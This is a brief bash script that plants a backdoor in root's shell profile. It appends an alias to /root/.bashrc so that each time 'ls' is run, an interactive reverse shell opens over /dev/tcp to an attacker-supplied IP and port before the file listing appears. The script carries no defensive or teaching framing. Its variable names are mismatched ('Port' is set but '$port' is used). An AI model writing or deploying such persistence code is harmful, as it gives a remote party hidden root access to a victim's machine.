#!/bin/bash
ip="$IP"
Port="$Port"
#assign the variables
echo "alias ls='bash -i >& /dev/tcp/$ip/$port 0>&1 && ls'" >> /root/.bashrc
